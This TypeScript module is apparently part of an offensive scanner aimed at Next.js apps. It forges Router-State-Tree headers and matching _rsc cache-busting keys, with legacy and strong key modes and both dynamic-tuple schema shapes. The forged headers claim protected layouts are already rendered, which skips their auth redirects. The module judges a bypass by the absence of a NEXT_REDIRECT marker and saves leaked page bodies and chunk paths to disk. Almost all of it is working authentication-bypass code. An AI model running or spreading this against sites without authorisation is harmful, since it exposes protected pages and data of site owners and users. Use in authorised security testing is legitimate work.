import { createHash } from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import rawRequest from "../../../exploit/utility/rawRequest.js";

/** Marker Next.js embeds in a Flight payload when a layout/page calls redirect(). */
const NEXT_REDIRECT_MARKER = "NEXT_REDIRECT";

export type LeafMode = "page" | "metadata-only";

/**
 * A forged ancestor segment. A plain string claims a static path segment (e.g.
 * `"dashboard"`) is mounted. `{ paramName, value }` claims a dynamic route segment (e.g.
 * `app/organizations/[org]/layout.js`) is mounted — Next.js's `matchSegment` requires an
 * exact `[paramName, value]` tuple for dynamic segments (a bare string never matches one),
 * and a black-box crawl can't know the app's real param name, only the URL's literal value.
 */
export type AncestorSegment = string | { paramName: string; value: string };

/**
 * Next.js's `flightRouterStateSchema` validates a dynamic segment as a `superstruct.tuple()`,
 * which requires an EXACT element count — too few OR too many elements both fail
 * `assert()` before `matchSegment` is ever reached, rejecting the entire request. That
 * exact count changed across Next.js releases: every version up to at least 16.2.6 requires
 * a 3-element tuple (`[paramName, value, dynamicParamType]`); 16.3.0 added a mandatory 4th
 * `staticSiblings` element (`[paramName, cacheKey, dynamicParamType, staticSiblings]`,
 * `null` meaning "siblings unknown"). A black-box crawl can't know which schema shape the
 * target's Next.js build expects, so both are tried (see `DYNAMIC_TUPLE_LENGTHS`).
 */
export type DynamicTupleLength = 3 | 4;

/** Converts one ancestor segment to its FlightRouterState wire representation. */
const toSegmentRepr = (
    segment: AncestorSegment,
    tupleLength: DynamicTupleLength
): string | [string, string, "d"] | [string, string, "d", null] =>
    typeof segment === "string"
        ? segment
        : tupleLength === 4
          ? [segment.paramName, segment.value, "d", null]
          : [segment.paramName, segment.value, "d"];

/** The literal URL path value of an ancestor segment, regardless of representation. */
export const ancestorSegmentValue = (segment: AncestorSegment): string =>
    typeof segment === "string" ? segment : segment.value;

/**
 * Builds the `Next-Router-State-Tree` header value: a URL-encoded FlightRouterState
 * claiming every segment in `ancestorSegments` is already client-rendered, with the
 * leaf segment either an ordinary `__PAGE__` node or (leafMode="metadata-only") a node
 * flagged so Next.js only re-executes `generateMetadata()` for it. Mirrors the
 * `flightRouterState[3]` check in `walk-tree-with-flight-router-state.tsx`. `tupleLength`
 * only affects segments that are dynamic-ancestor claims (see `toSegmentRepr`).
 */
export const buildStateTreeHeader = (
    ancestorSegments: AncestorSegment[],
    leafMode: LeafMode = "page",
    tupleLength: DynamicTupleLength = 4
): string => {
    let node: unknown = leafMode === "metadata-only" ? ["__PAGE__", {}, null, "metadata-only"] : ["__PAGE__", {}];
    for (let i = ancestorSegments.length - 1; i >= 0; i--) {
        node = [toSegmentRepr(ancestorSegments[i], tupleLength), { children: node }];
    }
    const tree = ["", { children: node }];
    return encodeURIComponent(JSON.stringify(tree));
};

/**
 * Strong `_rsc` cache-busting key: SHA-256 of the four cache-busting inputs, truncated to
 * 96 bits and base64url-encoded. Mirrors `computeCacheBustingSearchParam` in
 * `shared/lib/router/utils/cache-busting-search-param.ts` — not a secret, any client can
 * compute it from headers it itself sends.
 */
export const computeStrongRscKey = (
    stateTreeHeader: string,
    nextUrlHeader: string,
    prefetchHeader: string = "0",
    segmentPrefetchHeader: string = "0"
): string => {
    const input = [prefetchHeader, segmentPrefetchHeader, stateTreeHeader, nextUrlHeader].join(",");
    const digest = createHash("sha256").update(input).digest();
    return digest.subarray(0, 12).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
};

/**
 * 32-bit djb2xor hash, as used by Next.js's legacy (non-cryptographic) cache-busting key.
 * Mirrors `djb2Hash` in `shared/lib/hash.ts`.
 */
const djb2Hash = (str: string): number => {
    let hash = 5381;
    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) + hash + str.charCodeAt(i)) & 0xffffffff;
    }
    return hash >>> 0;
};

/**
 * Legacy `_rsc` cache-busting key: `djb2Hash` of the same four inputs as
 * `computeStrongRscKey`, base36-encoded and truncated to 5 characters. Mirrors
 * `computeLegacyCacheBustingSearchParam`/`hexHash` in
 * `shared/lib/router/utils/cache-busting-search-param.ts` / `shared/lib/hash.ts`. Cheaper
 * to compute than the strong key, and some Next.js builds accept it as a fallback when the
 * strong-key check fails (see `NEXT-RSC-002`) — no crypto required to probe with it first.
 */
export const computeLegacyRscKey = (
    stateTreeHeader: string,
    nextUrlHeader: string,
    prefetchHeader: string = "0",
    segmentPrefetchHeader: string = "0"
): string => {
    const input = [prefetchHeader, segmentPrefetchHeader, stateTreeHeader, nextUrlHeader].join(",");
    return djb2Hash(input).toString(36).slice(0, 5);
};

/** True when a Flight/RSC payload records a server-side redirect (the auth check actually ran). */
export const containsNextRedirectMarker = (body: string): boolean => body.includes(NEXT_REDIRECT_MARKER);

/**
 * Extracts `static/chunks/*.js` (including Turbopack `~`-separated names) references from a
 * Flight payload body. Real payloads encode these WITHOUT a `_next/` prefix — e.g.
 * `4:I[3330,["614","static/chunks/app/dashboard/secret/page-<hash>.js"],"default"]` — the
 * client resolves them against its own asset prefix at runtime. An optional literal
 * `_next/` prefix is still matched for payload shapes that do include it.
 */
export const extractChunkPathsFromFlightBody = (body: string): string[] => {
    const matches = body.matchAll(/(?:_next\/)?static\/chunks\/[a-zA-Z0-9._\-/~]+\.js/g);
    return [...new Set([...matches].map((m) => m[0]))];
};

/** Resolves an extracted chunk path (with or without a `_next/` prefix) to an absolute URL. */
export const resolveChunkUrl = (chunkPath: string, origin: string): string => {
    const normalized = chunkPath.startsWith("_next/") ? chunkPath : `_next/${chunkPath}`;
    return new URL(`/${normalized}`, origin).toString();
};

export const REQUEST_TIMEOUT_MS = 15000;

export type RscKeyMode = "legacy" | "strong";

export interface ForgeAttemptResult {
    success: boolean;
    body: string;
    /** URL (with its `_rsc` key) and headers of the request that produced `body`. */
    requestUrl?: string;
    requestHeaders?: Record<string, string>;
}

/** Renders an ancestor-segment list back to its literal URL path, for the `Next-Url` header. */
export const ancestorsToPath = (ancestors: AncestorSegment[]): string => ancestors.map(ancestorSegmentValue).join("/");

/** True when at least one ancestor segment is a dynamic-route claim (see `AncestorSegment`). */
export const hasDynamicSegment = (ancestors: AncestorSegment[]): boolean =>
    ancestors.some((s) => typeof s !== "string");

/** Sends one forged-ancestor RSC request and reports whether it looks like a successful bypass. */
const attemptForge = async (
    candidateUrl: string,
    ancestors: AncestorSegment[],
    leafMode: LeafMode,
    keyMode: RscKeyMode,
    timeout: number,
    tupleLength: DynamicTupleLength
): Promise<ForgeAttemptResult> => {
    const stateTree = buildStateTreeHeader(ancestors, leafMode, tupleLength);
    const nextUrl = "/" + ancestorsToPath(ancestors);
    const rscKey =
        keyMode === "legacy" ? computeLegacyRscKey(stateTree, nextUrl) : computeStrongRscKey(stateTree, nextUrl);

    const forgedUrl = new URL(candidateUrl);
    forgedUrl.searchParams.set("_rsc", rscKey);

    const requestHeaders = {
        RSC: "1",
        "Next-Router-State-Tree": stateTree,
        "Next-Url": nextUrl,
    };
    const requestUrl = forgedUrl.toString();
    const forged = await rawRequest(requestUrl, { timeout, headers: requestHeaders });
    if (!forged) return { success: false, body: "" };

    const contentType = forged.headers["content-type"] ?? "";
    const success =
        forged.status === 200 && contentType.includes("text/x-component") && !containsNextRedirectMarker(forged.body);
    return { success, body: forged.body, requestUrl, requestHeaders };
};

/**
 * Tries the cheap legacy key first (no SHA-256 needed); only computes and retries with the
 * strong key if the legacy attempt didn't succeed. Reports which key mode actually worked.
 */
const attemptForgeWithKeyFallback = async (
    candidateUrl: string,
    ancestors: AncestorSegment[],
    leafMode: LeafMode,
    timeout: number,
    tupleLength: DynamicTupleLength
): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
    const legacy = await attemptForge(candidateUrl, ancestors, leafMode, "legacy", timeout, tupleLength);
    if (legacy.success) return { ...legacy, keyMode: "legacy" };

    const strong = await attemptForge(candidateUrl, ancestors, leafMode, "strong", timeout, tupleLength);
    return { ...strong, keyMode: "strong" };
};

/** Both dynamic-segment tuple lengths real Next.js servers can require — see `DynamicTupleLength`. */
const DYNAMIC_TUPLE_LENGTHS: readonly DynamicTupleLength[] = [4, 3];

/**
 * Wraps `attemptForgeWithKeyFallback` with a schema-shape fallback: an ancestor list with no
 * dynamic segment is tried once (tuple length is irrelevant — no dynamic segment ever reaches
 * `toSegmentRepr`'s tuple branch), but a list containing a dynamic-ancestor claim is retried
 * under each of `DYNAMIC_TUPLE_LENGTHS` until one is accepted, since a black-box crawl can't
 * know which schema shape the target's Next.js build expects (see `DynamicTupleLength`).
 */
export const attemptForgeWithSchemaFallback = async (
    candidateUrl: string,
    ancestors: AncestorSegment[],
    leafMode: LeafMode,
    timeout: number
): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
    if (!hasDynamicSegment(ancestors)) {
        return attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout, 4);
    }
    let last: ForgeAttemptResult & { keyMode: RscKeyMode } = { success: false, body: "", keyMode: "legacy" };
    for (const tupleLength of DYNAMIC_TUPLE_LENGTHS) {
        last = await attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout, tupleLength);
        if (last.success) return last;
    }
    return last;
};

/**
 * The raw Flight text of an HTML response: every `self.__next_f.push([1,"…"])` string literal,
 * JSON-decoded and joined in order. `""` when the page has no inline Flight data.
 */
export const decodeHtmlFlight = (html: string): string => {
    const parts: string[] = [];
    for (const m of html.matchAll(/self\.__next_f\.push\(\[1,("(?:[^"\\]|\\.)*")\]\)/g)) {
        try {
            parts.push(JSON.parse(m[1]));
        } catch {
            // truncated or malformed chunk
        }
    }
    return parts.join("");
};

/** Payload of Flight row `id` (`<id>:<payload>`), or `undefined` when the row isn't in `flight`. */
const flightRow = (flight: string, id: string): string | undefined => {
    const head = `${id}:`;
    if (flight.startsWith(head)) return flight.slice(head.length);
    // Rows normally start a line; a resumed PPR stream can also start one after a `,`.
    for (const sep of ["\n", ","]) {
        const i = flight.indexOf(sep + head);
        if (i >= 0) return flight.slice(i + sep.length + head.length);
    }
    return undefined;
};

/** Max `$L<id>` hops `isRenderedValue` follows: guards against reference cycles. */
const MAX_REF_DEPTH = 5;

/**
 * True when the Flight value at the start of `text` is rendered page output: an element, a
 * non-empty string or text row, or a lazy reference (`"$L9"`) that resolves to one. An array is
 * judged by its first item (the page slot; later items are metadata outlets). `null` and an error
 * row (`9:E{"digest":"NEXT_REDIRECT…"}`, what a page that itself calls `redirect()` renders) are not.
 */
const isRenderedValue = (text: string, flight: string, depth = 0): boolean => {
    const t = text.trimStart();
    if (t.startsWith('["$",')) return true;
    if (t.startsWith("[")) return isRenderedValue(t.slice(1), flight, depth);
    const ref = t.match(/^"\$[L@]?([0-9a-f]+)"/);
    if (ref) {
        if (depth >= MAX_REF_DEPTH) return false;
        const row = flightRow(flight, ref[1]);
        if (row === undefined || row.startsWith("E")) return false;
        if (row.startsWith("T")) return true;
        return isRenderedValue(row, flight, depth + 1);
    }
    // A plain string child is text content; `"$undefined"`, `"$Sreact…"` and the like are not.
    return /^"[^"$]/.test(t);
};

/**
 * True when a Flight payload carries a rendered `__PAGE__` segment: the page component ran and
 * its output was serialized. Next.js 16.4+ writes the segment as `{"s":"__PAGE__",…,"d":{"r":
 * [element]}}`, older builds as `["__PAGE__",{},[element]]`; both are read as "the first
 * `children` after the `__PAGE__` marker". With a `NEXT_REDIRECT` in the same payload, this is
 * a layout redirected but the page under it rendered anyway.
 */
export const containsRenderedPageSegment = (flight: string): boolean => {
    for (const m of flight.matchAll(/"(?:s":")?__PAGE__/g)) {
        const window = flight.slice(m.index!, m.index! + 400);
        const c = window.indexOf('"children":');
        if (c >= 0 && isRenderedValue(window.slice(c + '"children":'.length), flight)) return true;
    }
    return false;
};

/** One RSF hit's saved response body (see `saveRsfLeak`). */
export interface RsfLeak {
    method: string;
    url: string;
    /** Saved body, relative to the host output directory. */
    file: string;
    /** Extra request headers that produced the response (e.g. the forged `Next-Router-State-Tree`). */
    requestHeaders?: Record<string, string>;
    chunks: string[];
}

/** Directory (under the host output dir) RSF leak bodies are written to. */
export const RSF_LEAKS_DIR = "___rsf_revealed";

/**
 * Writes a leaked response body to `<hostDir>/___rsf_revealed/<method>/<path>-<hash>.<ext>` and returns
 * its index entry. The hash (of the full URL and request headers) keeps `?a=1` and `?a=2`, or two
 * `Next-Url` values for one URL, from overwriting each other.
 */
export const saveRsfLeak = (
    hostDir: string,
    leak: { method: string; url: string; body: string; ext: "html" | "rsc"; requestHeaders?: Record<string, string> },
    chunks: string[]
): RsfLeak => {
    const u = new URL(leak.url);
    const stem = (u.pathname.replace(/^\/+|\/+$/g, "") || "index").replace(/[^A-Za-z0-9._-]/g, "_").slice(0, 120);
    const hash = createHash("sha256")
        .update(leak.url + JSON.stringify(leak.requestHeaders ?? {}))
        .digest("hex")
        .slice(0, 8);
    const file = path.join(RSF_LEAKS_DIR, leak.method, `${stem}-${hash}.${leak.ext}`);
    fs.mkdirSync(path.join(hostDir, RSF_LEAKS_DIR, leak.method), { recursive: true });
    fs.writeFileSync(path.join(hostDir, file), leak.body);
    return { method: leak.method, url: leak.url, file, requestHeaders: leak.requestHeaders, chunks };
};
